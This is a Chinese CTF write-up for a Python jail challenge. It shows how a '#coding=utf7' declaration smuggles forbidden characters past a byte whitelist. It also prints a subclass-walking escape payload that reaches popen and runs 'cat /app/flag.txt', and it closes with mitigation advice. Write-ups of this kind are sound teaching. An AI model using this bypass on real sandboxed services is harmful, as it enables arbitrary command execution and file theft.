# aaas

## 题目简述

题目是一个 Python jail。输入会先经过字节白名单，只允许字母、数字、空白以及 `+`、`=`、`#`，随后以 `exec(line, {}, env)` 执行。常见的引号、括号、点号和下划线都无法直接出现，看上去很难构造任何有副作用的 Python 表达式。

漏洞在于 `exec` 接收的是字节串，Python 会先处理源码编码声明；白名单检查的是编码前字节，解释器执行的却是解码后的源码。

## 解题过程

UTF-7 能用 `+` 开始一段经过 Base64 编码的 UTF-16BE 数据，而 Base64 字符本身全部落在题目白名单内。构造输入时先放置编码声明：

```text
#coding=utf7
+<base64-data>
```

其中 `<base64-data>` 是任意 Python 源码按 UTF-16BE 编码后的 Base64，末尾 `=` 可以去掉；输入结束也能终止这段 UTF-7 编码。于是过滤器只看到 `#coding=utf7`、加号和字母数字，Python 解码后却重新得到括号、引号、点号和下划线等被禁字符。

解码后的代码不依赖 `__builtins__`，而是遍历 `object` 的子类，找到 `os._wrap_close`，再由其初始化函数的全局变量取得 `popen`：

```python
for cls in ().__class__.__base__.__subclasses__():
    if cls.__name__ == "_wrap_close":
        print(cls.__init__.__globals__["popen"]("cat /app/flag.txt").read())
```

将这段源码编码成上述 UTF-7 载荷并提交，白名单检查通过，`exec` 执行还原后的代码，输出：

```text
maple{w7f7_py7h0n_3nc0d1ng_d3cl4r4710ns}
```

## 方法总结

字符白名单必须作用在解释器真正执行的规范化文本上。只要运行时支持源码编码声明、转义、Unicode 规范化或二次解析，“过滤前后不是同一种表示”就可能造成绕过。本题的关键观察是输入类型为 `bytes`；若先严格按固定 UTF-8 解码，再解析抽象语法树并限制语义，攻击面会小得多。
